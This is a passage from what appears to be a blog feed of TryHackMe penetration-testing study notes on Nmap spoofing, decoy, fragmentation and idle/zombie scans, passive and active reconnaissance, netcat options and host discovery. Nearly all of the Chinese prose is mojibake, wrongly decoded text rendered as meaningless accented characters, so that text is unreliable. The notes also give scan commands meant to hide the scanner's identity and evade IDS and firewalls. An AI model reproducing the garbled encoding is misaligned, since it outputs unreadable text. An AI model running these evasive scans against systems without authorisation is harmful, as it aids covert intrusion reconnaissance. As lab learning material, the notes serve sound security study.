‡å¿—ä½çš„tcpæ•°æ®åŒ…ï¼Œä½†éœ€è¦äº†è§£ä¸åŒç«¯å£çš„è¡Œä¸ºæ–¹å¼ï¼Œä»¥ä¾¿æ­£ç¡®è§£é‡Šä¸åŒåœºæ™¯ä¸­çš„ç»“æœã€‚</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/d76c5020f14ac0d66e7ff3812bb0bec3.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/d76c5020f14ac0d66e7ff3812bb0bec3.png"></p><p>å°è¯•ä½¿ç”¨è®¾ç½®äº†é‡ç½®æ ‡å¿—çš„è‡ªå®šä¹‰ TCP æ‰«æ</p><p><code>*nmap --scanflags RST ip*</code></p><p><strong>æœ€åï¼Œå¿…é¡»æ³¨æ„çš„æ˜¯ï¼ŒACK æ‰«æå’Œçª—å£æ‰«æåœ¨å¸®åŠ©æˆ‘ä»¬è§„åˆ’é˜²ç«å¢™è§„åˆ™æ–¹é¢éå¸¸æœ‰æ•ˆã€‚ä½†æ˜¯ï¼Œå¿…é¡»è®°ä½ï¼Œä»…ä»…å› ä¸ºé˜²ç«å¢™æ²¡æœ‰é˜»æ­¢ç‰¹å®šç«¯å£ï¼Œå¹¶ä¸ä¸€å®šæ„å‘³ç€æœåŠ¡æ­£åœ¨ä¾¦å¬è¯¥ç«¯å£ã€‚ä¾‹å¦‚ï¼Œå¯èƒ½éœ€è¦æ›´æ–°é˜²ç«å¢™è§„åˆ™ä»¥åæ˜ æœ€è¿‘çš„æœåŠ¡æ›´æ”¹ã€‚å› æ­¤ï¼ŒACK å’Œçª—å£æ‰«ææš´éœ²çš„æ˜¯é˜²ç«å¢™è§„åˆ™ï¼Œè€Œä¸æ˜¯æœåŠ¡ã€‚</strong></p><h2 id="æ¬ºéª—å’Œè¯±é¥µ"><a href="#æ¬ºéª—å’Œè¯±é¥µ" class="headerlink" title="æ¬ºéª—å’Œè¯±é¥µ"></a>æ¬ºéª—å’Œè¯±é¥µ</h2><p>åœ¨æŸäº›ç½‘ç»œä¸­æˆ‘ä»¬ä¼šä½¿ç”¨ä¼ªé€ çš„ipå’Œmacåœ°å€æ¥æ‰«æç›®æ ‡æœåŠ¡å™¨ã€‚è¿™ç§æ‰«æä»…åœ¨å¯ä»¥ä¿è¯æ•è·å“åº”çš„æƒ…å†µä¸‹æ‰æœ‰ç”¨ã€‚</p><p><code>nmap -S ä¼ªé€ ip æºip</code> </p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/45b982d501fd26deb2b381059b16f80c.png" alt="img"></p><p>ç®€å•æ¥è¯´ä½¿ç”¨æ¬ºéª—ipè¿›è¡Œæ‰«æåˆ†ä¸ºä¸‰æ­¥ï¼š</p><p>1.ä¼ªé€ ipï¼Œå‘ç›®æ ‡æœåŠ¡å™¨å‘é€æ•°æ®è¯·æ±‚ã€‚</p><p>2.ç›®æ ‡æœåŠ¡å™¨å‘ä¼ªé€ çš„ipå‘é€å“åº”ã€‚</p><p>3.æ”»å‡»è€…ä»ä¸­è¿›è¡Œæ•è·ï¼Œæ‰¾å‡ºå¼€æ”¾çš„ç«¯å£ã€‚</p><p><code>nmap -e NET_INTERFACE -Pn -S SPOOFED_IP MACHINE_IP</code></p><p>-eæŒ‡å®šç½‘ç»œæ¥å£ -Pç¦æ­¢ä½¿ç”¨ping</p><p>å¦‚æœæ”»å‡»è€…ç³»ç»Ÿæ— æ³•ç›‘æ§ç½‘ç»œå“åº”ï¼Œåˆ™æ­¤æ‰«æå°†æ¯«æ— ç”¨å¤„ã€‚</p><p>å½“æˆ‘ä»¬å’Œç›®æ ‡æœåŠ¡å™¨å¤„äºåŒä¸€å­ç½‘ä¸­æ—¶ï¼Œå¯ä»¥ä¼ªé€ macåœ°å€ã€‚</p><p><code>nmap --spoof-mac SPOOFED_MAC MACHINE_IP</code></p><p>æ¬ºéª—ä»…åœ¨æ»¡è¶³ç‰¹å®šæ¡ä»¶çš„æå°‘æ•°æƒ…å†µä¸‹æœ‰æ•ˆï¼Œå› æ­¤æ”»å‡»è€…ä¼šä½¿ç”¨è¯±é¥µæ¥å¢åŠ è¢«è¯†åˆ«çš„éš¾åº¦ã€‚</p><p>åŸç†ï¼šè®©æ‰«æçœ‹èµ·æ¥æ¥è‡ªå¤šä¸ªipï¼Œè®©çœŸå®çš„ipä¸¢å¤±åœ¨å…¶ä¸­ã€‚</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/754fc455556a424ca83f512665beaf7d.png" alt="img"></p><p><code>nmap -D ip1,ip2,ME MACHINE_IP</code> å°†ä½¿ MACHINE_IP çš„æ‰«ææ˜¾ç¤ºä¸ºæ¥è‡ªIP1,ip2 ç„¶å<code>ME</code>è¡¨ç¤ºçœŸå®çš„IPåœ°å€åº”å‡ºç°åœ¨ç¬¬ä¸‰é¡ºåºä¸­</p><p><code>nmap -D IP1,IP2,RND,RND,ME MACHINE_IP</code>  ç¬¬ä¸‰ä¸ªå’Œç¬¬å››ä¸ªipæ˜¯éšæœºçš„ ç„¶åç¬¬äº”ä¸ªä»£è¡¨çœŸå®çš„ipåœ°å€ã€‚</p><h2 id="ç¢ç‰‡æ•°æ®åŒ…"><a href="#ç¢ç‰‡æ•°æ®åŒ…" class="headerlink" title="ç¢ç‰‡æ•°æ®åŒ…"></a>ç¢ç‰‡æ•°æ®åŒ…</h2><p>æŠŠæ•°æ®åŒ…åˆ†ä¸ºå‡ ä¸ªå°éƒ¨åˆ†ï¼Œå¯¹é™ä½IDSå’Œé˜²ç«å¢™æ£€æµ‹æœ‰ä¸€äº›å¸®åŠ©ã€‚</p><p>-få°†æ•°æ®åŒ…åˆ†ä¸º8ä¸ªå­—èŠ‚æˆ–è€…æ›´å°‘çš„å­—èŠ‚ï¼Œ-ffå°†æ•°æ®åŒ…åˆ†ä¸º16ä¸ªå­—èŠ‚ã€‚â€“mtuå¯ä»¥æ›´æ”¹æ•°æ®åŒ…åˆ†å‡ ä¸ªå­—èŠ‚çš„å¤§å°ï¼Œä½†åº”è¯¥æ˜¯8çš„å€æ•°ã€‚</p><h2 id="Idle-Zombie-Scan-ç©ºé—²-åƒµå°¸æ‰«æ"><a href="#Idle-Zombie-Scan-ç©ºé—²-åƒµå°¸æ‰«æ" class="headerlink" title="Idle/Zombie Scan(ç©ºé—²/åƒµå°¸æ‰«æ)"></a>Idle/Zombie Scan(ç©ºé—²/åƒµå°¸æ‰«æ)</h2><p>ä¼ªé€ æºipæ˜¯æœ‰ä¸€å®šé™åˆ¶æ¡ä»¶çš„ï¼Œå¦‚æœä¸èƒ½è¿›è¡Œæµé‡ç›‘æ§çš„è¯ï¼Œå°±ä¸èƒ½è¿›è¡Œæºipçš„ä¼ªé€ ã€‚æ­¤æ—¶ï¼Œåˆ©ç”¨ç©ºé—²/åƒµå°¸æ‰«æå¯ä»¥è¿›è¡Œä¸€ä¸ªå‡çº§ã€‚</p><p>ç©ºé—²/åƒµå°¸æ‰«æå°±æ˜¯æ‰¾ä¸€ä¸ªæå°‘ä½¿ç”¨çš„ç©ºé—²ç³»ç»Ÿ(æˆ‘ä»¬å¯ä»¥è”é€š)ï¼Œé€šè¿‡ip idçš„æ•°é‡å·®å€¼æ¥åˆ¤æ–­ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚</p><p><code>nmap -sI ç©ºé—²ä¸»æœºip ç›®æ ‡ä¸»æœºip</code></p><p>æ­¥éª¤ï¼š<br>1.é¦–å…ˆå‘ç©ºé—²/åƒµå°¸ä¸»æœºå‘é€ä¸€ä¸ªSYN/ACKçš„æ•°æ®åŒ…ï¼Œç©ºé—²ä¸»æœºä¼šå‘æ”»å‡»è€…å›å¤ä¸€ä¸ªIP IDã€‚</p><p>2.æ”»å‡»è€…å†å‘ç›®æ ‡ä¸»æœºå‘é€ä¸€ä¸ªSYN/ACKçš„æ•°æ®åŒ…ï¼Œè¯¥æ•°æ®åŒ…åº”è¯¥è¢«ä¼ªè£…æˆæ¥è‡ªç©ºé—²/åƒµå°¸ä¸»æœºçš„ipã€‚</p><p>3.å†å‘ç©ºé—²ä¸»æœºå‘é€ä¸€ä¸ªSYN/ACKçš„æ•°æ®åŒ…ï¼Œç©ºé—²ä¸»æœºä¼šå†æ¬¡å‘é€ä¸€ä¸ªIP ID,å°†ç¬¬ä¸€ä¸ªIP IDå’Œç¬¬ä¸‰ä¸ªIP IDè¿›è¡Œä¸€ä¸ªå¯¹æ¯”ï¼Œå¦‚æœå·®å€¼ä¸º2çš„è¯ç«¯å£å°±å¼€æ”¾ï¼Œå°±ä¸€ä¸ªçš„è¯ç«¯å£å°±å…³é—­ã€‚</p><p>ä¸‹é¢ç”¨tryhackemeçš„å›¾æ¥è§£é‡Šä¸€ä¸‹ï¼š</p><p>æ”»å‡»è€…ç³»ç»Ÿæ­£åœ¨æ¢æµ‹ä¸€å°ç©ºé—²çš„æœºå™¨ï¼Œä¸€å°å¤šåŠŸèƒ½æ‰“å°æœºã€‚é€šè¿‡å‘é€ SYN/ACKï¼Œå®ƒä¼šç”¨ä¸€ä¸ªåŒ…å«å…¶æ–°å¢åŠ çš„ IP ID çš„ RST æ•°æ®åŒ…è¿›è¡Œå“åº”ã€‚</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/a93e181f0effe000554a8b307448bbb2.png" alt="img"></p><p>æ”»å‡»è€…å°†å‘ä¸‹ä¸€æ­¥æƒ³è¦æ£€æŸ¥ç›®æ ‡æœºå™¨çš„TCPç«¯å£å‘é€ SYN æ•°æ®åŒ…ã€‚ä½†æ˜¯ï¼Œæ­¤æ•°æ®åŒ…å°†ä½¿ç”¨ç©ºé—²ä¸»æœºï¼ˆåƒµå°¸ï¼‰IP åœ°å€ä½œä¸ºæºã€‚å°†å‡ºç°ä¸‰ç§æƒ…å†µã€‚åœ¨ç¬¬ä¸€ç§æƒ…å†µä¸‹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œ TCPç«¯å£å·²å…³é—­ï¼›å› æ­¤ï¼Œç›®æ ‡æœºå™¨ä½¿ç”¨ RST æ•°æ®åŒ…å“åº”ç©ºé—²ä¸»æœºã€‚ç©ºé—²ä¸»æœºä¸å“åº”ï¼›å› æ­¤å…¶ IP ID ä¸ä¼šå¢åŠ ã€‚</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/8e28bf940936ddbc2367b193ea3550b8.png" alt="img"></p><p>ç¬¬äºŒç§æƒ…å†µï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼ŒTCPç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œå› æ­¤ç›®æ ‡æœºå™¨å‘ç©ºé—²ä¸»æœºï¼ˆåƒµå°¸ä¸»æœºï¼‰å“åº” SYN/ACKã€‚ç©ºé—²ä¸»æœºç”¨ RST æ•°æ®åŒ…å“åº”è¿™ä¸ªæ„å¤–æ•°æ®åŒ…ï¼Œä»è€Œå¢åŠ å…¶ IP IDã€‚</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/2b0de492e2154a30760852e07cebae0e.png" alt="img"></p><p>ç¬¬ä¸‰ç§æƒ…å†µæ˜¯ï¼Œç›®æ ‡æœºå™¨ç”±äºé˜²ç«å¢™è§„åˆ™è€Œå®Œå…¨æ²¡æœ‰å“åº”ã€‚è¿™ç§æ²¡æœ‰å“åº”çš„æƒ…å†µä¸å…³é—­ç«¯å£çš„æƒ…å†µä¸€æ ·ï¼Œé—²ç½®çš„ä¸»æœºä¸ä¼šå¢åŠ  IP IDã€‚</p><p>æœ€åä¸€æ­¥ï¼Œæ”»å‡»è€…å‘ç©ºé—²ä¸»æœºå‘é€å¦ä¸€ä¸ª SYN/ACKã€‚ç©ºé—²ä¸»æœºç”¨ RST æ•°æ®åŒ…å“åº”ï¼Œå†æ¬¡å°† IP ID åŠ ä¸€ã€‚æ”»å‡»è€…éœ€è¦å°†ç¬¬ä¸€æ­¥æ”¶åˆ°çš„ RST æ•°æ®åŒ…çš„ IP ID ä¸ç¬¬ä¸‰æ­¥æ”¶åˆ°çš„ RST æ•°æ®åŒ…çš„ IP ID è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœå·®å€¼ä¸º 1ï¼Œåˆ™è¡¨ç¤ºç›®æ ‡è®¡ç®—æœºä¸Šçš„ç«¯å£å·²å…³é—­æˆ–è¢«è¿‡æ»¤ã€‚ä½†æ˜¯ï¼Œå¦‚æœå·®å€¼ä¸º 2ï¼Œåˆ™è¡¨ç¤ºç›®æ ‡ä¸Šçš„ç«¯å£å·²æ‰“å¼€ã€‚</p><p>å¦‚æœæˆ‘ä»¬é€‰æ‹©çš„å¹¶ä¸æ˜¯ç©ºé—²ä¸»æœºï¼Œè¿”å›å›æ¥çš„IP IDæ˜¯æ— ç”¨çš„ã€‚</p><p><code>nmap -sS --reason ip</code> å¯è®©æˆ‘ä»¬æ˜ç¡®äº†è§£ Nmap ä¸ºä½•è®¤ä¸ºç³»ç»Ÿå·²å¯åŠ¨æˆ–æŸä¸ªç‰¹å®šç«¯å£å·²æ‰“å¼€ã€‚</p><p>ä¸ºäº†è·å–æ›´è¯¦ç»†çš„è¾“å‡ºï¼Œ-ä½¿ç”¨-v/-vv  æˆ–è€…ä½¿ç”¨-d</p>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Passive Reconnaissance</title>
    <link href="/2024/07/09/%E8%A2%AB%E5%8A%A8%E4%BE%A6%E5%AF%9F/"/>
    <url>/2024/07/09/%E8%A2%AB%E5%8A%A8%E4%BE%A6%E5%AF%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="Passive-Reconnaissance"><a href="#Passive-Reconnaissance" class="headerlink" title="Passive Reconnaissance"></a>Passive Reconnaissance</h1><p>è¢«åŠ¨ä¾¦å¯Ÿï¼Œäº†è§£whois,nslookup,digç­‰å·¥å…·çš„ä½¿ç”¨</p><p>whoisï¼ŒæŸ¥è¯¢whoisæœåŠ¡å™¨ï¼Œnslookupå’Œdigæ˜¯æŸ¥è¯¢dnsæœåŠ¡å™¨</p><p>è¢«åŠ¨ä¾¦å¯Ÿç®€å•æ¥è¯´å°±æ˜¯ä¸å»ä¸»åŠ¨æ¥è§¦è¦æ”»å‡»çš„ç›®æ ‡ï¼Œè€Œæ˜¯é€šè¿‡ä¸å…¶ç›¸å…³çš„ä¸€äº›èµ„æºå»è°ƒæŸ¥å®ƒã€‚</p><p>ä¸»åŠ¨ä¾¦å¯Ÿåˆ™ç›®æ ‡æ€§æ›´æ˜ç¡®ä¸€ç‚¹ï¼Œéœ€è¦å¯¹ç›®æ ‡è¿›è¡Œä¸»åŠ¨æ¥è§¦ï¼Œåˆ©ç”¨ç¤¾ä¼šå·¥ç¨‹å­¦ï¼Œè¿æ¥åˆ°ç›®æ ‡çš„æœåŠ¡å™¨ä¸Šç­‰(å‰ææ˜¯éœ€è¦æˆæƒï¼)</p><h3 id="whosiï¼ˆåŸŸåç®¡ç†å‘˜ï¼‰"><a href="#whosiï¼ˆåŸŸåç®¡ç†å‘˜ï¼‰" class="headerlink" title="whosiï¼ˆåŸŸåç®¡ç†å‘˜ï¼‰"></a>whosiï¼ˆåŸŸåç®¡ç†å‘˜ï¼‰</h3><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202406021807602.png" alt="image-20240602180747484"></p><h3 id="nslookupå’Œdig"><a href="#nslookupå’Œdig" class="headerlink" title="nslookupå’Œdig"></a>nslookupå’Œdig</h3><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202406021841505.png" alt="image-20240602184122380"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202406021843197.png" alt="image-20240602184307137"></p><p>typeå¯ä»¥è¿›è¡Œæ›´æ¢ï¼Œç„¶åä¸åŒçš„typeä»£è¡¨ä¸åŒçš„æ„æ€ã€‚å…·ä½“çš„æ„ä¹‰å‚è€ƒä¸Šå›¾</p><p>å…¬å…±åŸŸåæœåŠ¡å™¨:</p><p>1.1.1.1 8.8.8.8 114.114.114.114 1.0.0.1 8.8.4.4 9.9.9.9 ç­‰</p><h3 id="DNSDumpster"><a href="#DNSDumpster" class="headerlink" title="DNSDumpster"></a>DNSDumpster</h3><p><a href="https://dnsdumpster.com/">DNSDumpster.com - dns recon and research, find and lookup dns records</a></p><p>å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªåœ¨çº¿æŸ¥è¯¢å­åŸŸçš„ä¸€ä¸ªç½‘ç«™</p><h3 id="Shodan-io"><a href="#Shodan-io" class="headerlink" title="Shodan.io"></a>Shodan.io</h3><p><a href="https://www.shodan.io/">Shodan Search Engine</a></p><p>ç±»ä¼¼äºfofa </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202406021912669.png" alt="image-20240602191215461"></p>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Active Reconnaissance</title>
    <link href="/2024/07/09/%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F/"/>
    <url>/2024/07/09/%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="Active-Reconnaissance"><a href="#Active-Reconnaissance" class="headerlink" title="Active Reconnaissance"></a>Active Reconnaissance</h1><p>ä¸»åŠ¨ä¾¦å¯Ÿ</p><p>é‡è¦çš„ä¸€ç‚¹å°±æ˜¯è¦è¢«æˆæƒï¼</p><h3 id="webæµè§ˆå™¨ä¸Šçš„ä¸€äº›å·¥å…·"><a href="#webæµè§ˆå™¨ä¸Šçš„ä¸€äº›å·¥å…·" class="headerlink" title="webæµè§ˆå™¨ä¸Šçš„ä¸€äº›å·¥å…·"></a>webæµè§ˆå™¨ä¸Šçš„ä¸€äº›å·¥å…·</h3><p>1.FoxyProxy ï¼ˆä»£ç†å·¥å…·ï¼‰</p><p>2.Wappalyzer ï¼ˆæ”¶é›†ç½‘ç«™çš„ç›¸å…³ä¿¡æ¯ï¼‰</p><p>3.User-Agent Switcher and Manager (ä¼ªé€ User-Agent)                                                                                                            </p><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>ç®€å•æ¥è¯´å°±æ˜¯æ£€æŸ¥ç›®æ ‡ç³»ç»Ÿæ˜¯å¦åœ¨çº¿</p><p>æ›´ä¸¥è°¨çš„è¯æ¥è¯´å°±æ˜¯ï¼šping æ˜¯ä¸€ä¸ªå‘è¿œç¨‹ç³»ç»Ÿå‘é€ ICMP Echo æ•°æ®åŒ…çš„å‘½ä»¤ã€‚å¦‚æœè¿œç¨‹ç³»ç»Ÿåœ¨çº¿ï¼Œå¹¶ä¸” ping æ•°æ®åŒ…è¢«æ­£ç¡®è·¯ç”±ä¸”æœªè¢«ä»»ä½•é˜²ç«å¢™é˜»æ­¢ï¼Œåˆ™è¿œç¨‹ç³»ç»Ÿåº”å‘å› ICMP Echo Replyã€‚åŒæ ·ï¼Œå¦‚æœ ping å›å¤è¢«æ­£ç¡®è·¯ç”±ä¸”æœªè¢«ä»»ä½•é˜²ç«å¢™é˜»æ­¢ï¼Œåˆ™ ping å›å¤åº”åˆ°è¾¾ç¬¬ä¸€ä¸ªç³»ç»Ÿã€‚</p><p>åœ¨linuxä¸­ping -c 10 ip è¡¨ç¤ºåªå‘é€10ä¸ªæ•°æ®åŒ… åœ¨windowsä¸­å°±æ˜¯ping -n 10 ip</p><p>pingä¸åŒæœ‰ä¸‹é¢å‡ ç§æƒ…å†µï¼š</p><ul><li>ç›®æ ‡è®¡ç®—æœºæ²¡æœ‰å“åº”ï¼›å¯èƒ½ä»åœ¨å¯åŠ¨æˆ–å…³é—­ï¼Œæˆ–è€…æ“ä½œç³»ç»Ÿå·²å´©æºƒã€‚</li><li>å®ƒå·²ä»ç½‘ç»œæ‹”å‡ºï¼Œæˆ–è€…è·¯å¾„ä¸Šæœ‰æ•…éšœçš„ç½‘ç»œè®¾å¤‡ã€‚</li><li>é˜²ç«å¢™é…ç½®ä¸ºé˜»æ­¢æ­¤ç±»æ•°æ®åŒ…ã€‚é˜²ç«å¢™å¯èƒ½æ˜¯ç³»ç»Ÿæœ¬èº«ä¸Šè¿è¡Œçš„è½¯ä»¶æˆ–å•ç‹¬çš„ç½‘ç»œè®¾å¤‡ã€‚è¯·æ³¨æ„ï¼ŒMS Windows é˜²ç«å¢™é»˜è®¤é˜»æ­¢ pingã€‚</li><li>æ‚¨çš„ç³»ç»Ÿå·²æ–­å¼€ä¸ç½‘ç»œçš„è¿æ¥ã€‚</li></ul><h3 id="traceroute-è¿½è¸ªè·¯ç”±"><a href="#traceroute-è¿½è¸ªè·¯ç”±" class="headerlink" title="traceroute(è¿½è¸ªè·¯ç”±)"></a>traceroute(è¿½è¸ªè·¯ç”±)</h3><p>traceroute å‘½ä»¤<em>ä¼šè·Ÿè¸ªæ•°æ®åŒ…ä»æ‚¨çš„ç³»ç»Ÿåˆ°å¦ä¸€å°ä¸»æœºæ‰€é‡‡ç”¨çš„è·¯ç”±</em>ã€‚traceroute çš„ç›®çš„æ˜¯æ‰¾åˆ°æ•°æ®åŒ…ä»æ‚¨çš„ç³»ç»Ÿåˆ°ç›®æ ‡ä¸»æœºæ‰€ç»è¿‡çš„è·¯ç”±å™¨æˆ–è·³æ•°çš„ IP åœ°å€ã€‚æ­¤å‘½ä»¤è¿˜ä¼šæ˜¾ç¤ºä¸¤ä¸ªç³»ç»Ÿä¹‹é—´çš„è·¯ç”±å™¨æ•°é‡ã€‚å®ƒå¾ˆæœ‰ç”¨ï¼Œå› ä¸ºå®ƒæŒ‡ç¤ºäº†æ‚¨çš„ç³»ç»Ÿå’Œç›®æ ‡ä¸»æœºä¹‹é—´çš„è·³æ•°ï¼ˆè·¯ç”±å™¨ï¼‰ã€‚ä½†æ˜¯ï¼Œè¯·æ³¨æ„ï¼Œæ•°æ®åŒ…æ‰€é‡‡ç”¨çš„è·¯ç”±å¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œå› ä¸ºè®¸å¤šè·¯ç”±å™¨ä½¿ç”¨é€‚åº”ç½‘ç»œå˜åŒ–çš„åŠ¨æ€è·¯ç”±åè®®ã€‚</p><p>åœ¨linuxä¸­é€šå¸¸ä½¿ç”¨traceroute åœ¨windowsä¸­é€šå¸¸ä½¿ç”¨tracert</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407080959982.png" alt="image-20240708095938778"></p><p>ttlä¸ºç”Ÿå­˜æ—¶é—´ æ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨ ttlå€¼å‡å°‘1 å½“ttlå€¼ä¸º0çš„æ—¶å€™ è·¯ç”±å™¨ä¼šå‘å‘é€è€…å‘å‡ºæ—¶é—´è¶…æ—¶çš„ä¿¡æ¯ã€‚</p><h3 id="telnet-è¿œç¨‹ç™»å½•"><a href="#telnet-è¿œç¨‹ç™»å½•" class="headerlink" title="telnet(è¿œç¨‹ç™»å½•)"></a>telnet(è¿œç¨‹ç™»å½•)</h3><p>ä½¿ç”¨çš„é»˜è®¤ç«¯å£æ˜¯23</p><p>telnetå‘é€çš„æ•°æ®éƒ½æ˜¯ä»¥æ˜æ–‡çš„å½¢å¼å‘é€ï¼Œå®¹æ˜“è¢«è·å– ä»£æ›¿çš„æ˜¯ssh</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407081026818.png" alt="image-20240708102624751"></p><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p>Netcat æˆ–ç®€å•åœ°è¯´<code>nc</code>æœ‰ä¸åŒçš„åº”ç”¨ç¨‹åºå¯¹æ¸—é€æµ‹è¯•äººå‘˜æ¥è¯´éå¸¸æœ‰ä»·å€¼ã€‚Netcat æ”¯æŒ TCP å’ŒUDPåè®®ã€‚å®ƒå¯ä»¥ä½œä¸ºè¿æ¥åˆ°ä¾¦å¬ç«¯å£çš„å®¢æˆ·ç«¯ï¼›æˆ–è€…ï¼Œå®ƒå¯ä»¥å……å½“ä¾¦å¬æ‚¨é€‰æ‹©çš„ç«¯å£çš„æœåŠ¡å™¨ã€‚å› æ­¤ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ–¹ä¾¿çš„å·¥å…·ï¼Œæ‚¨å¯ä»¥å°†å…¶ç”¨ä½œ TCP æˆ–UDPä¸Šçš„ç®€å•å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨ã€‚</p><table><thead><tr><th>é€‰é¡¹</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td>-l</td><td>è†å¬æ¨¡å¼</td></tr><tr><td>-p</td><td>æŒ‡å®šç«¯å£å·</td></tr><tr><td>-n</td><td>ä»…é™æ•°å­—ï¼›æ— æ³•é€šè¿‡DNSè§£æä¸»æœºå</td></tr><tr><td>-v</td><td>è¯¦ç»†è¾“å‡ºï¼ˆå¯é€‰ï¼Œä½†æœ‰åŠ©äºå‘ç°ä»»ä½•é”™è¯¯ï¼‰</td></tr><tr><td>-vv</td><td>éå¸¸è¯¦ç»†ï¼ˆå¯é€‰ï¼‰</td></tr><tr><td>-k</td><td>å®¢æˆ·ç«¯æ–­å¼€è¿æ¥åç»§ç»­ç›‘å¬</td></tr></tbody></table><ul><li>è¯¥é€‰é¡¹<code>-p</code>åº”è¯¥å‡ºç°åœ¨æ‚¨æƒ³è¦ç›‘å¬çš„ç«¯å£å·ä¹‹å‰ã€‚</li><li>è¯¥é€‰é¡¹<code>-n</code>å°†é¿å…DNSæŸ¥æ‰¾å’Œè­¦å‘Šã€‚</li><li>å°äº 1024 çš„ç«¯å£å·éœ€è¦ root æƒé™æ‰èƒ½ç›‘å¬ã€‚</li></ul>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nmap Live Host Discovery</title>
    <link href="/2024/07/09/nmap%E5%AE%9E%E6%97%B6%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%8F%91%E7%8E%B0/"/>
    <url>/2024/07/09/nmap%E5%AE%9E%E6%97%B6%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%8F%91%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Nmap-Live-Host-Discovery-nmapå®æ—¶ä¸»æœºçš„å‘ç°"><a href="#Nmap-Live-Host-Discovery-nmapå®æ—¶ä¸»æœºçš„å‘ç°" class="headerlink" title="Nmap Live Host Discovery (nmapå®æ—¶ä¸»æœºçš„å‘ç°)"></a>Nmap Live Host Discovery (nmapå®æ—¶ä¸»æœºçš„å‘ç°)</h1><ol><li>ARPæ‰«æï¼šæ­¤æ‰«æä½¿ç”¨ARPè¯·æ±‚æ¥å‘ç°æ´»åŠ¨ä¸»æœº</li><li>ICMP æ‰«æï¼šæ­¤æ‰«æä½¿ç”¨ ICMP è¯·æ±‚æ¥è¯†åˆ«æ´»åŠ¨ä¸»æœº</li><li>TCP/ UDP ping æ‰«æï¼šæ­¤æ‰«æå°†æ•°æ®åŒ…å‘é€åˆ° TCP ç«¯å£å’ŒUDPç«¯å£ä»¥ç¡®å®šæ´»åŠ¨ä¸»æœºã€‚</li></ol><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f1b4ede255e008646e425038d709c9b6.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f1b4ede255e008646e425038d709c9b6.png"></p><p>å½“åœ¨åŒä¸€ç½‘æ®µå†…çš„æ—¶å€™ ï¼Œå¯ä»¥ä½¿ç”¨arp-scanæ¥è¿›è¡Œæ‰«æï¼Œä½†å¦‚æœç›®æ ‡ä¸»æœºä¸å†åŒä¸€ç½‘æ®µå†…ï¼Œå°±ä¸èƒ½ä½¿ç”¨arp-scanè¿›è¡Œæ‰«æ å› ä¸ºarpæ˜¯åœ¨æ•°æ®é“¾è·¯å±‚ï¼Œä¸èƒ½å¤Ÿè·¨ç½‘æ®µã€‚</p><ul><li>åˆ—è¡¨ï¼š<code>MACHINE_IP scanme.nmap.org example.com</code>å°†æ‰«æ 3 ä¸ª IP åœ°å€ã€‚</li><li>èŒƒå›´ï¼š<code>10.11.12.15-20</code>å°†æ‰«æ 6 ä¸ª IP åœ°å€ï¼š<code>10.11.12.15</code>ã€ã€ <code>10.11.12.16</code>â€¦â€¦å’Œ<code>10.11.12.20</code>ã€‚</li><li>å­ç½‘ï¼š<code>MACHINE_IP/30</code>å°†æ‰«æ 4 ä¸ª IP åœ°å€ã€‚</li></ul><p>æ‚¨è¿˜å¯ä»¥æä¾›ä¸€ä¸ªæ–‡ä»¶ä½œä¸ºç›®æ ‡åˆ—è¡¨çš„è¾“å…¥<code>nmap -iL list_of_hosts.txt</code>ã€‚</p><p>å¦‚æœæ‚¨æƒ³è¦æ£€æŸ¥Nmapå°†æ‰«æçš„ä¸»æœºåˆ—è¡¨ï¼Œå¯ä»¥ä½¿ç”¨<code>nmap -sL 